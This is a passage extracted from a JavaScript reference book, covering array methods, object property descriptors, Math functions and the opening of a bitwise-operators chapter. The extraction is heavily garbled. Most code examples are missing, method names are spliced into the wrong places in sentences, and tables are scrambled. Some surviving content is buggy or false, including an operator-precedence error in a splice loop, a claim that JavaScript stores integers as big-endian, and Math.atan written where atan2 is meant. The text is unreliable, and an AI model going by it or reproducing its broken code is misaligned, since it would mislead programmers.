splitslice(""To split a string into an array call . with an empty string (""). Important Note: This only works if all of your characters fit in the Unicode lower range characters, which covers most English and most European languages. For languages that require 3 and 4 byte Unicode characters, ) will separate them.
var strArray = "StackOverflow".split("");
// strArray = ["S", "t", "a", "c", "k", "O", "v", "e", "r", "f", "l", "o", "w"]
Version ≥ 6
Using the spread operator (...), to convert a string into an array.
var strArray = [..."sky is blue"];        
// strArray = ["s", "k", "y", " ", "i", "s", " ", "b", "l", "u", "e"]
Section 12.18: Removing items from an array
Shift
shiftUse . to remove the first item of an array.
For example:

array results in:

Pop
popFurther . is used to remove the last item from an array.
For example:

array results in:

Both methods return the removed item;
Splice
splice() to remove a series of elements from an array. .spliceUse .() accepts two parameters, the starting
spliceindex, and an optional number of elements to delete. If the second parameter is left out .() will remove all elements from the starting index through the end of the array.
For example:

leaves array containing:

array.spliceThe return of () is a new array containing the removed elements. For the example above, the return would be:

Thus, omitting the second parameter effectively splits the array into two arrays, with the original ending before the index specified:

Delete
Use delete to remove item from array without changing the length of array:

Array.prototype.length
Assigning value to length of array changes the length to given value. If new value is less than array length items will be removed from the end of value.

Section 12.19: Removing all elements

Method 1
Creates a new array and overwrites the existing array reference with a new one.

Care must be taken as this does not remove any items from the original array. The array may have been closed over when passed to a function. The array will remain in memory for the life of the function though you may not be aware of this. This is a common source of memory leaks.
Example of a memory leak resulting from bad array clearing:

To prevent the risk of a memory leak use the one of the following 2 methods to empty the array in the above example's while loop.
Method 2
Setting the length property deletes all array element from the new array length to the old array length. It is the most efficient way to remove and dereference all items in the array. Keeps the reference to the original array

Method 3
Similar to method 2 but returns a new array containing the removed items. If you do not need the items this method is inefficient as the new array is still created only to be immediately dereferenced.
arr.splice(0); // should not use if you don't want the removed items
// only use this method if you do the following var keepArr = arr.splice(0); // empties the array and creates a new array containing the                              // removed items
Related question.
Section 12.20: Finding the minimum or maximum element
Math.min.applyMath.max.applyIf your array or array-like object is numeric, that is, if all its elements are numbers, then you can use or  by passing null as the first argument, and your array as the second.


Version ≥ 6
In ES6 you can use the ... operator to spread an array and take the minimum or maximum element.


Version ≥ 5.1
Array.prototype.reduceThe following example uses () to find the minimum or maximum:

Version ≥ 6 or using arrow functions:

To generalize the reduce version we'd have to pass in an initial value to cover the empty list case:

For the details on how to properly use reduce see Reducing values.
Section 12.21: Standard array initialization
There are many ways to create arrays. The most common are to use array literals, or the Array constructor:

If the Array constructor is used with no arguments, an empty array is created.

results in:

Note that if it's used with exactly one argument and that argument is a number, an array of that length with all undefined values will be created instead:

results in:

That does not apply if the single argument is non-numeric:

results in:
["foo"]
Version ≥ 6
Array.ofSimilar to an array literal,  can be used to create a new Array instance given a number of arguments:

results in:

Array.of(2323In contrast to the Array constructor, creating an array with a single number such as ) will create a new array [], rather than an Array with length 23.
Array.fromThe other way to create and initialize an array would be 
var newArray = Array.from({ length: 5 }, (_, index) => Math.pow(index, 4));
will result:

Section 12.22: Joining array elements in a string
To join all of an array's elements into a string, you can use the join method:

console.log([1, 800, 555, 1234].join("-")); // "1-800-555-1234"
As you can see in the second line, items that are not strings will be converted first.
Section 12.23: Removing/Adding elements using splice()
spliceThe ()method can be used to remove elements from an array. In this example, we remove the first 3 from the array.

spliceThe () method can also be used to add elements to an array. In this example, we will insert the numbers 6, 7, and 8 to the end of the array.

spliceThe first argument of the () method is the index at which to remove/insert elements. The second argument is the number of elements to remove. The third argument and onwards are the values to insert into the array.
Section 12.24: The entries() method
entriesThe () method returns a new Array Iterator object that contains the key/value pairs for each index in the array. Version ≥ 6

result

Note: This method is not supported in Internet Explorer.
Array.prototype.entriesPortions of this content from  by Mozilla Contributors licensed under CC-by-SA 2.5
Section 12.25: Remove value from array
When you need to remove a specific value from an array, you can use the following one-liner to create a copy array without the given value:

Or if you want to change the array itself without creating a copy (for example if you write a function that get an array as a function and manipulates it) you can use this snippet: while(index = array.indexOf(3) !== -1) { array.splice(index, 1); } And if you need to remove just the first value found, remove the while loop:

Section 12.26: Flattening Arrays
2 Dimensional arrays Version ≥ 6
In ES6, we can flatten the array by the spread operator ...:

Version ≥ 5
In ES5, we can achieve that by .apply():

Higher Dimension Arrays
Given a deeply nested array like so

It can be flattened with this magic

Or

Both of the above methods only work when the array is made up exclusively of numbers. A multi-dimensional array of objects cannot be flattened by this method.
Section 12.27: Append / Prepend items to Array
Unshift
.unshiftUse  to add one or more items in the beginning of an array.
For example:

array results in:

Push
.pushFurther  is used to add items after the last currently existent item.
For example:

array results in:

Both methods return the new array length.
Section 12.28: Object keys and values to array

Now array is

Section 12.29: Logical connective of values
Version ≥ 5.1
some and .every. allow a logical connective of Array values.
some combines the return values with OR, .everyWhile . combines them with AND.
someExamples for .


Section 12.30: Checking if an object is an Array
Array.isArray(obj) returns true if the object is an Array, otherwise false.

In most cases you can instanceof to check if an object is an Array.

Array.isArray has the an advantage over using a instanceof check in that it will still return true even if the
prototype of the array has been changed and will return false if a non-arrays prototype was changed to the Array prototype.

Section 12.31: Insert an item into an array at a specific index
Array.prototype.spliceSimple item insertion can be done with  method:

More advanced variant with multiple arguments and chaining support:

And with array-type arguments merging and chaining support:

Section 12.32: Sorting multidimensional array
Given the following array

You can sort it sort it by number(second index)

Version ≥ 6

This will output

Be aware that the sort method operates on the array in place. It changes the array. Most other array methods return a new array, leaving the original one intact. This is especially important to note if you use a functional programming style and expect functions to not have side-effects.
Section 12.33: Test all array items for equality
everyThe . method tests if all array elements pass a provided predicate test.
To test all objects for equality, you can use the following code snippets.
[1, 2, 1].every(function(item, i, list) { return item === list[0]; }); // false
[1, 1, 1].every(function(item, i, list) { return item === list[0]; }); // true
Version ≥ 6

The following code snippets test for property equality

Version ≥ 6

Section 12.34: Copy part of an Array
The slice() method returns a copy of a portion of an array.
arr.slice([begin[, endIt takes two parameters, ]]) :
begin
Zero-based index which is the beginning of extraction.
end
Zero-based index which is the end of extraction, slicing up to this index but it's not included.
end = arr.length + endIf the end is a negative number,.
Example 1

Example 2


Chapter 13: Objects
for in  Property	Description value	The value to assign to the property. writable	Whether the value of the property can be changed or not. enumerable Whether the property will be enumerated in  loops or not. configurable Whether it will be possible to redefine the property descriptor or not. get	A function to be called that will return the value of the property. set	A function to be called when the property is assigned a value.
Section 13.1: Shallow cloning
Version ≥ 6
Object.assignES6's () function can be used to copy all of the enumerable properties from an existing Object instance to a new one.

This includes Symbol properties in addition to String ones.
Object rest/spread destructuring which is currently a stage 3 proposal provides an even simpler way to create shallow clones of Object instances:

hasOwnPropertyIf you need to support older versions of JavaScript, the most-compatible way to clone an Object is by manually iterating over its properties and filtering out inherited ones using .().

Section 13.2: Object.freeze
Version ≥ 5
Object.freeze makes an object immutable by preventing the addition of new properties, the removal of existing
properties, and the modification of the enumerability, configurability, and writability of existing properties. It also prevents the value of existing properties from being changed. However, it does not work recursively which means that child objects are not automatically frozen and are subject to change.
The operations following the freeze will fail silently unless the code is running in strict mode. If the code is in strict

Section 13.3: Object cloning
When you want a complete copy of an object (i.e. the object properties and the values inside those properties, etc...), that is called deep cloning.
Version ≥ 5.1
JSON.parseIf an object can be serialized to JSON, then you can create a deep clone of it with a combination of  and
JSON.stringify:

JSON.stringify will convert Date objects to ISO-format string representations, but JSON.parseNote that  will not convert the string back into a Date.
There is no built-in function in JavaScript for creating deep clones, and it is not possible in general to create deep clones for every object for many reasons. For example,
objects can have non-enumerable and hidden properties which cannot be detected. object getters and setters cannot be copied. objects can have a cyclic structure. function properties can depend on state in a hidden scope.
Assuming that you have a "nice" object whose properties only contain primitive values, dates, arrays, or other "nice" objects, then the following function can be used for making deep clones. It is a recursive function that can detect objects with a cyclic structure and will throw an error in such cases.

Section 13.4: Object properties iteration
You can access each property that belongs to an object with this loop

You should include the additional check for hasOwnProperty because an object may have properties that are inherited from the object's base class. Not performing this check can raise errors.
Version ≥ 5
Object.keysArray.map or Array.forEachYou can also use  function which return an Array containing all properties of an object and then you can loop through this array with  function.

Section 13.5: Object.assign
The Object.assign() method is used to copy the values of all enumerable own properties from one or more source objects to a target object. It will return the target object.
Use it to assign values to an existing object:

Or to create a shallow copy of an object:

Or merge many properties from multiple objects to one:

Primitives will be wrapped, null and undefined will be ignored:

Use it as reducer: (merges an array to an object)
return users.reduce((result, user) => Object.assign({}, {[user.id]: user})
Section 13.6: Object rest/spread (...)
Version > 7
Object.assign({}, obj1, ..., objnObject spreading is just syntactic sugar for );
It is done with the ... operator:

Object.assignAs  it does shallow merging, not deep merging.

NOTE: This specification is currently in stage 3
Section 13.7: Object.defineProperty
Version ≥ 5
It allows us to define a property in an existing object using a property descriptor.

Console output
		foo
Object.defineProperty can be called with the following options:
Object.defineProperty(obj, 'nameOfTheProperty', {   value: valueOfTheProperty,   writable: true, // if false, the property is read-only   configurable : true, // true means the property can be changed later   enumerable : true // true means property can be enumerated such as in a for..in loop });
Object.defineProperties allows you to define multiple properties at a time.


Section 13.8: Accesor properties (get and set)
Version ≥ 5
Treat a property as a combination of two functions, one to get the value from it, and another one to set the value in it.
The get property of the property descriptor is a function that will be called to retrieve the value from the property.
The set property is also a function, it will be called when the property has been assigned a value, and the new value will be passed as an argument.
You cannot assign a value or writable to a descriptor that has get or set

Section 13.9: Dynamic / variable property names
Sometimes the property name needs to be stored into a variable. In this example, we ask the user what word needs to be looked up, and then provide the result from an object I've named dictionary.


Note how we are using [] bracket notation to look at the variable named word; if we were to use the traditional . notation, then it would take the value literally, hence:
console.log(dictionary.word)  // doesn't work because word is taken literally and dictionary has no field named `word` console.log(dictionary.apple) // it works! because apple is taken literally
console.log(dictionary[word]) // it works! because word is a variable, and the user perfectly typed in one of the words from our dictionary when prompted
console.log(dictionary[apple]) // error! apple is not defined (as a variable)
You could also write literal values with [] notation by replacing the variable word with a string 'apple'. See [Properties with special characters or reserved words] example.
You can also set dynamic properties with the bracket syntax:

It does the same as:

Section 13.10: Arrays are Objects
form.elements  Disclaimer: Creating array-like objects is not recommend. However, it is helpful to understand how they work, especially when working with DOM. This will explain why regular array operations don't work on DOM objects returned from many DOM document functions. (i.e. querySelectorAll, ) Supposing we created the following object which has some properties you would expect to see in an Array.

Then we'll create an array.

Now, notice how we can inspect both the object, and the array in the same way.
console.log(anArray[0], anObject[0]); // outputs: zero.  zero! console.log(anArray[1], anObject[1]); // outputs: one.  one!
console.log(anArray.length, anObject.length); // outputs: 2 interesting
console.log(anArray.foo, anObject.foo); // outputs: undefined bar
Since anArray is actually an object, just like anObject, we can even add custom wordy properties to anArray

We can even make anObject to be an array-like object by adding a length.

Then you can use the C-style for loop to iterate over anObject just as if it were an Array. See Array Iteration
Array.prototypeNote that anObject is only an array-like object. (also known as a List) It is not a true Array. This is important, because functions like push and forEach (or any convenience function found in ) will not work by default on array-like objects.
form.elementsMany of the DOM document functions will return a List (i.e. querySelectorAll, ) which is similar to the array-like anObject we created above. See Converting Array-like Objects to Arrays
console.log(typeof anArray == 'object', typeof anObject == 'object'); // outputs: true  true console.log(anArray instanceof Object, anObject instanceof Object); // outputs: true  true console.log(anArray instanceof Array, anObject instanceof Array); // outputs: true  false console.log(Array.isArray(anArray), Array.isArray(anObject)); // outputs: true  false
Section 13.11: Object.seal
Version ≥ 5
Object.seal prevents the addition or removal of properties from an object. Once an object has been sealed its
Object.freezeproperty descriptors can't be converted to another type. Unlike  it does allow properties to be edited.
Attempts to do this operations on a sealed object will fail silently



Section 13.12: Convert object's values to array
Given this object:

You can convert its values to an array by doing:

Section 13.13: Retrieving properties from an object
Characteristics of properties :
Properties that can be retrieved from an object could have the following characteristics,
Enumerable Non - Enumerable own
While creating the properties using Object.defineProperty(ies), we could set its characteristics except "own".
Properties which are available in the direct level not in the prototype level (__proto__) of an object are called as own properties.
Object.defindProperty(iesAnd the properties that are added into an object without using ) will don't have its enumerable characteristic. That means it be considered as true.
Purpose of enumerability :
The main purpose of setting enumerable characteristics to a property is to make the particular property's availability when retrieving it from its object, by using different programmatical methods. Those different methods will be discussed deeply below.
Methods of retrieving properties :
Properties from an object could be retrieved by the following methods,
for..in1. loop
This loop is very useful in retrieving enumerable properties from an object. Additionally this loop will retrieve enumerable own properties as well as it will do the same retrieval by traversing through the prototype chain until it sees the prototype as null.

Object.keys2.() function
for..inObject.prototype.hasOwnPropertyThis function was unveiled as a part of ECMAScript 5. It is used to retrieve enumerable own properties from an object. Prior to its release people used to retrieve own properties from an object by combining loop and () function.


Object.getOwnProperties3.() function
This function will retrieve both enumerable and non enumerable, own properties from an object. It was also released as a part of ECMAScript 5.

Miscellaneous :
A technique for retrieving all (own, enumerable, non enumerable, all prototype level) properties from an object is given below,

And this will be supported by the browsers which supports ECMAScript 5.
Section 13.14: Read-Only property
Version ≥ 5
Using property descriptors we can make a property read only, and any attempt to change its value will fail silently, the value will not be changed and no error will be thrown.
The writable property in a property descriptor indicates whether that property can be changed or not.

Console output
		original
Section 13.15: Non enumerable property
Version ≥ 5
for (... in ...We can avoid a property from showing up in ) loops
The enumerable property of the property descriptor tells whether that property will be enumerated while looping through the object's properties.

Console output
		show
Section 13.16: Lock property description
Version ≥ 5
A property's descriptor can be locked so no changes can be made to it. It will still be possible to use the property normally, assigning and retrieving the value from it, but any attempt to redefine it will throw an exception.
The configurable property of the property descriptor is used to disallow any further changes on the descriptor.

This error will be thrown:
		TypeError: Cannot redefine property: foo
And the property will still be read only.

Console output
		original value
Section 13.17: Object.getOwnPropertyDescriptor
Get the description of a specific property in an object.

Section 13.18: Descriptors and Named Properties
object.propertyNameProperties are members of an object. Each named property is a pair of (name, descriptor). The name is a string that allows access (using the dot notation  or the square brackets notation
object['propertyName']). The descriptor is a record of fields defining the bevahiour of the property when it is
accessed (what happens to the property and what is the value returned from accessing it). By and large, a property associates a name to a behavior (we can think of the behavior as a black box).
There are two types of named properties:
1. data property: the property's name is associated with a value.
2. accessor property: the property's name is associated with one or two accessor functions.
Demonstration:
obj.propertyName1 = 5; //translates behind the scenes into
                       //either assigning 5 to the value field* if it is a data property
                //or calling the set function with the parameter 5 if accessor property
//*actually whether an assignment would take place in the case of a data property
//also depends on the presence and value of the writable field - on that later on
The property's type is determined by its descriptor's fields, and a property cannot be of both types.
Data descriptors -
Required fields: value or writable or both Optional fields:configurable,enumerable
Sample:

Accessor descriptors -
Required fields: get or set or both
Optional fields: configurable, enumerable
Sample:

meaning of fields and their defaults configurable,enumerable and writable:
These keys all default to false. configurable is true if and only if the type of this property descriptor may be changed and if the property may be deleted from the corresponding object.
enumerable is true if and only if this property shows up during enumeration of the properties on the corresponding object.
writable is true if and only if the value associated with the property may be changed with an assignment operator.
get and set:
These keys default to undefined. get is a function which serves as a getter for the property, or undefined if there is no getter. The function return will be used as the value of the property.
set is a function which serves as a setter for the property, or undefined if there is no setter. The function will receive as only argument the new value being assigned to the property.
value:
This key defaults to undefined.
The value associated with the property. Can be any valid JavaScript value (number, object, function, etc).
Example:
    var obj = {propertyName1: 1}; //the pair is actually ('propertyName1', {value:1,                                                                     // writable:true,
                                                                    // enumerable:true,
                                                                    // configurable:true})     Object.defineProperty(obj, 'propertyName2', {get: function() {                                                     console.log('this will be logged ' +                                  'every time propertyName2 is accessed to get its value');                                                 },                                             set: function() {                                                     console.log('and this will be logged ' +                                 'every time propertyName2\'s value is tried to be set')
                      //will be treated like it has enumerable:false, configurable:false
                                                }});
//propertyName1 is the name of obj's data property //and propertyName2 is the name of its accessor property
obj.propertyName1 = 3; console.log(obj.propertyName1); //3
obj.propertyName2 = 3; //and this will be logged every time propertyName2's value is tried to be set console.log(obj.propertyName2); //this will be logged every time propertyName2 is accessed to get its value
Section 13.19: Object.keys
Version ≥ 5

Section 13.20: Properties with special characters or reserved words
myObject.propertyWhile object property notation is usually written as , this will only allow characters that are normally found in JavaScript variable names, which is mainly letters, numbers and underscore (_).
If you need special characters, such as space, ☺, or user-provided content, this is possible using [] bracket notation.

In addition to special characters, property names that are all-digits will require bracket notation. However, in this case the property need not be written as a string.
myObject[123] = 'hi!' // number 123 is automatically converted to a string console.log(myObject['123']) // notice how using string 123 produced the same result console.log(myObject['12' + '3']) // string concatenation console.log(myObject[120 + 3]) // arithmetic, still resulting in 123 and producing the same result console.log(myObject[123.0]) // this works too because 123.0 evaluates to 123 console.log(myObject['123.0']) // this does NOT work, because '123' != '123.0'
However, leading zeros are not recommended as that is interpreted as Octal notation. (TODO, we should produce and link to an example describing octal, hexadecimal and exponent notation)
See also: [Arrays are Objects] example.
Section 13.21: Creating an Iterable object
Version ≥ 6

Console output
		One
Section 13.22: Iterating over Object entries - Object.entries()
Version ≥ 8
Object.entriesThe proposed () method returns an array of key/value pairs for the given object. It does not return
Array.prototype.entries(), but the Array returned by Object.entriesan iterator like () can be iterated regardless.

Results in:

It is an useful way of iterating over the key/value pairs of an object:

Section 13.23: Object.values()
Version ≥ 8
Object.valuesThe () method returns an array of a given object's own enumerable property values, in the same order as that provided by a for...in loop (the difference being that a for-in loop enumerates properties in the prototype chain as well).

Note:
For browser support, please refer to this link
Chapter 14: Arithmetic (Math)
Section 14.1: Constants
	Constants	Description	Approximate
Math	.E	Base of natural logarithm e	2.718
Math.LN10	Natural logarithm of 10	2.302
Math.LN2	Natural logarithm of 2	0.693
Math.LOG10E	Base 10 logarithm of e	0.434
Math.LOG2E	Base 2 logarithm of e	1.442
Math.PIPi: the ratio of circle circumference to
                                       3.14 diameter (π)
Math.SQRT1_2	Square root of 1/2	0.707
Math.SQRT2	Square root of 2	1.414
Difference between one and the smallest
Number.EPSILONvalue greater than one representable as	2.2204460492503130808472633361816E-16 a Number
n Largest integer n such that n and + 1
Number.MAX_SAFE_INTEGERare both exactly representable as a	2^53 - 1 Number
Number.MAX_VALUE	Largest positive finite value of Number	1.79E+308
n Smallest integer n such that n and - 1
Number.MIN_SAFE_INTEGERare both exactly representable as a	-(2^53 - 1) Number
Number.MIN_VALUE	Smallest positive value for Number	5E-324
Number.NEGATIVE_INFINITYValue of negative infinity (-∞)
Number.POSITIVE_INFINITYValue of positive infinity (∞)
Infinity	Value of positive infinity (∞)
Section 14.2: Remainder / Modulus (%)
The remainder / modulus operator (%) returns the remainder after (integer) division.

This operator returns the remainder left over when one operand is divided by a second operand. When the first operand is a negative value, the return value will always be negative, and vice versa for positive values.
 10 42 In the example above, 10 can be subtracted four times from 42 before there is not enough left to subtract again without it changing sign. The remainder is thus: - 4 *= 2.
The remainder operator may be useful for the following problems:
1. Test if an integer is (not) divisible by another number:


 === -0, this also works for x <= Since 0-0.
 n2. Implement cyclic increment/decrement of value within [0,) interval.
Suppose that we need to increment integer value from 0 to (but not including) n, so the next value after n-1 become
0. This can be done by such pseudocode:

Now generalize the above problem and suppose that we need to allow to both increment and decrement that value from 0 to (not including) n, so the next value after n-1 become 0 and the previous value before 0 become n-1.

deltaNow we can call () function passing any integer, both positive and negative, as delta parameter.

Section 14.3: Rounding
Rounding
Math.round() will round the value to the closest integer using half round up to break ties.

But

2.5Note how - is rounded to -2. This is because half-way values are always rounded up, that is they're rounded to the integer with the next higher value.
Rounding up
Math.ceil() will round the value up.

ceiling a negative number will round towards zero

Rounding down
Math.floor() will round the value down.

flooring a negative number will round it away from zero.

Truncating
2147483649Caveat: using bitwise operators (except >>>) only applies to numbers between - and 2147483648.
2.3  | 0;                       // 2 (floor) -2.3 | 0;                       // -2 (ceil) NaN  | 0;                       // 0
Version ≥ 6
Math.trunc()
Math.trunc(2.3);                // 2 (floor) Math.trunc(-2.3);               // -2 (ceil)
Math.trunc(2147483648.1);       // 2147483648 (floor) Math.trunc(-2147483649.1);      // -2147483649 (ceil)
Math.trunc(NaN);                // NaN
Rounding to decimal places
Math.floor, Math.ceil(), and Math.round() can be used to round to a number of decimal places
To round to 2 decimal places:
 var myNum = 2/3;               // 0.6666666666666666  var multiplier = 100;  var a = Math.round(myNum * multiplier) / multiplier;  // 0.67  var b = Math.ceil (myNum * multiplier) / multiplier;  // 0.67  var c = Math.floor(myNum * multiplier) / multiplier;  // 0.66
You can also round to a number of digits:

  var b = Math.ceil (myNum * multiplier) / multiplier;  // 3400  var c = Math.floor(myNum * multiplier) / multiplier;  // 3300 As a more usable function:


Section 14.4: Trigonometry
180 * r / Math.PIAll angles below are in radians. An angle r in radians has measure  in degrees.
Sine

This will return the sine of r, a value between -1 and 1.

This will return the arcsine (the reverse of the sine) of r.

This will return the hyperbolic arcsine of r.
Cosine

This will return the cosine of r, a value between -1 and 1

This will return the arccosine (the reverse of the cosine) of r.

This will return the hyperbolic arccosine of r.



including π.
Section 14.5: Bitwise operators
Note that all bitwise operations operate on 32-bit integers by passing any operands to the internal function ToInt32.
Bitwise or

Bitwise and

Bitwise not



Math.pow(2, nShift left is equivalent to integer multiply by ). When doing integer math, shift can significantly improve the speed of some math operations.

Bitwise right shift >> (Sign-propagating shift) >>> (Zero-fill right shift)

A negative 32bit value always has the left most bit on:
a = 0b11111111111111111111111111110111 | 0;  console.log(a); // -9 b = a >> 2;     // leftmost bit is shifted 1 to the right then new left most bit is set to on (1) console.log(b); // -3 b = a >>> 2;    // leftmost bit is shifted 1 to the right. the new left most bit is set to off (0) console.log(b); // 2147483643
The result of a >>> operation is always positive.
The result of a >> is always the same sign as the shifted value.
Math.powRight shift on positive numbers is the equivalent of dividing by the (2,n) and flooring the result:

Right shift zero fill (>>>) on negative numbers is different. As JavaScript does not convert to unsigned ints when doing bit operations there is no operational equivalent:
// result is false
Bitwise assignment operators
With the exception of not (~) all the above bitwise operators can be used as assignment operators:

Warning: JavaScript uses Big Endian to store integers. This will not always match the Endian of the device/OS. When using typed arrays with bit lengths greater than 8 bits you should check if the environment is Little Endian or Big Endian before applying bitwise operations.
Warning: Bitwise operators such as & and | are not the same as the logical operators && (and) and || (or). They will provide incorrect results if used as logical operators. The ^ operator is not the power operator (ab).
Section 14.6: Incrementing (++)
The Increment operator (++) increments its operand by one.

In this case, a is incremented after setting b. So, b will be 5, and c will be 6.

In this case, a is incremented before setting b. So, b will be 6, and c will be 6.
The increment and decrement operators are commonly used in for loops, for example:

Notice how the prefix variant is used. This ensures that a temporarily variable isn't needlessly created (to return the value prior to the operation).
Section 14.7: Exponentiation (Math.pow() or **)
Exponentiation makes the second operand the power of the first operand (ab).

c will now be 8
Version > 6
Stage 3 ES2016 (ECMAScript 7) Proposal:


c will now be 8
Use Math.pow to find the nth root of a number.
Finding the nth roots is the inverse of raising to the nth power. For example 2 to the power of 5 is 32. The 5th root of 32 is 2.
Math.pow(v, 1 / n); // where v is any positive real number                     // and n is any positive integer
var a = 16; var b = Math.pow(a, 1 / 2);  // return the square root of 16 = 4 var c = Math.pow(a, 1 / 3);  // return the cubed root of 16 = 2.5198420997897464 var d = Math.pow(a, 1 / 4);  // return the 4th root of 16 = 2
Section 14.8: Random Integers and Floats

Sample value of a: 0.21322848065742162
Math.random() returns a random number between 0 (inclusive) and 1 (exclusive)

Math.randommin, maxTo use () to get a number from an arbitrary range (not [0,1)) use this function to get a random number between min (inclusive) and max (exclusive): interval of [)

Math.randommin, maxTo use () to get an integer from an arbitrary range (not [0,1)) use this function to get a random number between min (inclusive) and max (exclusive): interval of [)

Math.randommin, maxTo use () to get an integer from an arbitrary range (not [0,1)) use this function to get a random number between min (inclusive) and max (inclusive): interval of []

Functions taken from https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/random
Section 14.9: Addition (+)
The addition operator (+) adds numbers.

c will now be 12
This operand can also be used multiple times in a single assignment:

d will now be 20.
Both operands are converted to primitive types. Then, if either one is a string, they're both converted to strings and concatenated. Otherwise, they're both converted to numbers and added.

If the operands are a string and a number, the number is converted to a string and then they're concatenated, which may lead to unexpected results when working with strings that look numeric.

If a boolean value is given in place of any of the number values, the boolean value is converted to a number (0 for false, 1 for true) before the sum is calculated:

If a boolean value is given alongside a string value, the boolean value is converted to a string instead:

Section 14.10: Little / Big endian for typed arrays when using bitwise operators
To detect the endian of the device


Little-Endian stores most significant bytes from right to left.
Big-Endian stores most significant bytes from left to right.

If the system uses Little-Endian, then the 8bit byte values will be

If the system uses Big-Endian, then the 8bit byte values will be

Example where Endian type is important

Section 14.11: Get Random Between Two Numbers
Returns a random integer between min and max:

Examples:

Section 14.12: Simulating events with dierent probabilities
Sometimes you may only need to simulate an event with two outcomes, maybe with different probabilities, but you may find yourself in a situation that calls for many possible outcomes with different probabilities. Let's imagine you want to simulate an event that has six equally probable outcomes. This is quite simple.

However, you may not want equally probable outcomes. Say you had a list of three outcomes represented as an array of probabilities in percents or multiples of likelihood. Such an example might be a weighted die. You could rewrite the previous function to simulate such an event.

As you probably noticed, these functions return an index, so you could have more descriptive outcomes stored in an array. Here's an example.
var rewards = ["gold coin","silver coin","diamond","god sword"]; var likelihoods = [5,9,1,0];
// least likely to get a god sword (0/15 = 0%, never),
// most likely to get a silver coin (9/15 = 60%, more than half the time)
// simulate event, log reward
console.log("You get a "+rewards[simulateEvent(likelihoods)]);  // You get a silver coin
Section 14.13: Subtraction (-)
The subtraction operator (-) subtracts numbers.

c will now be 6
If a string or boolean is provided in place of a number value, it gets converted to a number before the difference is calculated (0 for false, 1 for true):

If the string value cannot be converted into a Number, the result will be NaN:

Section 14.14: Multiplication (*)
The multiplication operator (*) perform arithmetic multiplication on numbers (literals or variables).

Section 14.15: Getting maximum and minimum
Math.maxThe () function returns the largest of zero or more numbers.

Math.minThe () function returns the smallest of zero or more numbers.


ECMAScript 6 spread operator, getting the maximum and minimum of an array:

Section 14.16: Restrict Number to Min/Max Range
If you need to clamp a number to keep it inside a specific range boundary

Use-case example (jsFiddle)
Section 14.17: Ceiling and Floor
ceil()
ceil()The  method rounds a number upwards to the nearest integer, and returns the result.
Syntax:

Example:

floor()The  method rounds a number downwards to the nearest integer, and returns the result.
Syntax:

Example:

Section 14.18: Getting roots of a number
Square Root
Math.sqrtUse () to find the square root of a number

Cube Root
Math.cbrtTo find the cube root of a number, use the () function
Version ≥ 6
Math.cbrt(27)  #=> 3
Finding nth-roots
Math.powTo find the nth-root, use the () function and pass in a fractional exponent.

Section 14.19: Random with gaussian distribution
Math.randomThe () function should give random numbers that have a standard deviation approaching 0. When picking from a deck of card, or simulating a dice roll this is what we want.
But in most situations this is unrealistic. In the real world the randomness tends to gather around an common normal value. If plotted on a graph you get the classical bell curve or gaussian distribution.
Math.randomTo do this with the () function is relatively simple.
var randNum = (Math.random() + Math.random()) / 2; var randNum = (Math.random() + Math.random() + Math.random()) / 3;
var randNum = (Math.random() + Math.random() + Math.random() + Math.random()) / 4;
Adding a random value to the last increases the variance of the random numbers. Dividing by the number of times you add normalises the result to a range of 0-1
As adding more than a few randoms is messy a simple function will allow you to select a variance you want.


The image shows the distribution of random values for different values of v. The top left is standard single
Math.random() call the bottom right is Math.random() summed 8 times. This is from 5,000,000 samples using
Chrome
This method is most efficient at v<5
Section 14.20: Math.atan2 to find direction
If you are working with vectors or lines you will at some stage want to get the direction of a vector, or line. Or the direction from a point to another point.
Math.atan(yComponent, xComponent) return the angle in radius within the range of -Math.PI to Math.PI (-180 to 180 deg)

Direction of a line

Direction from a point to another point
var point1 = { x: 123, y : 294}; var point2 = { x: 354, y : 284};
// get the direction from point1 to point2
var dir = Math.atan2(point2.y - point1.y, point2.x - point1.x); // -0.04326303140726714
Section 14.21: Sin & Cos to create a vector given direction & distance
If you have a vector in polar form (direction & distance) you will want to convert it to a cartesian vector with a x and y component. For reference the screen coordinate system has directions as 0 deg points from left to right, 90 (PI/2) point down the screen, and so on in a clock wise direction.


You can also ignore the distance to create a normalised (1 unit long) vector in the direction of dir

If your coordinate system has y as up then you need to switch cos and sin. In this case a positive direction is in a counterclockwise direction from the x axis.

Section 14.22: Math.hypot
To find the distance between two points we use pythagoras to get the square root of the sum of the square of the component of the vector between them.

Math.hypotWith ECMAScript 6 came  which does the same thing

Now you don't have to hold the interim vars to stop the code becoming a mess of variables

Math.hypot can take any number of dimensions

Section 14.23: Periodic functions using Math.sin
Math.sin and Math.cos are cyclic with a period of 2*PI radians (360 deg) they output a wave with an amplitude of 2
in the range -1 to 1.
Graph of sine and cosine function: (courtesy Wikipedia)

They are both very handy for many types of periodic calculations, from creating sound waves, to animations, and even encoding and decoding image data
This example shows how to create a simple sin wave with control over period/frequency, phase, amplitude, and offset.
The unit of time being used is seconds.
The most simple form with control over frequency only.

In almost all cases you will want to make some changes to the value returned. The common terms for modifications
Phase: The offset in terms of frequency from the start of the oscillations. It is a value in the range of 0 to 1 where the value 0.5 move the wave forward in time by half its frequency. A value of 0 or 1 makes no change. Amplitude: The distance from the lowest value and highest value during one cycle. An amplitude of 1 has a range of 2. The lowest point (trough) -1 to the highest (peak) 1. For a wave with frequency 1 the peak is at
0.25 seconds, and trough at 0.75.
 Offset: moves the whole wave up or down.
To include all these in the function:
function oscillator(time, frequency = 1, amplitude = 1, phase = 0, offset = 0){     var t = time * frequency * Math.PI * 2; // get phase at time

Or in a more compact (and slightly quicker form):
function oscillator(time, frequency = 1, amplitude = 1, phase = 0, offset = 0){     return Math.sin(time * frequency * Math.PI * 2 + phase * Math.PI * 2) * amplitude + offset; }
All the arguments apart from time are optional
Section 14.24: Division (/)
The division operator (/) perform arithmetic division on numbers (literals or variables).

Section 14.25: Decrementing (--)
The decrement operator (--) decrements numbers by one.

In this case, b is set to the initial value of a. So, b will be 5, and c will be 4.

In this case, b is set to the new value of a. So, b will be 4, and c will be 4.
Common Uses
The decrement and increment operators are commonly used in for loops, for example:

Notice how the prefix variant is used. This ensures that a temporarily variable isn't needlessly created (to return the value prior to the operation).
Note: Neither -- nor ++ are like normal mathematical operators, but rather they are very concise operators for assignment. Notwithstanding the return value, both


Chapter 15: Bitwise operators
Section 15.1: Bitwise operators
Bitwise operators perform operations on bit values of data. These operators convert operands to signed 32-bit integers in two's complement.
Conversion to 32-bit integers
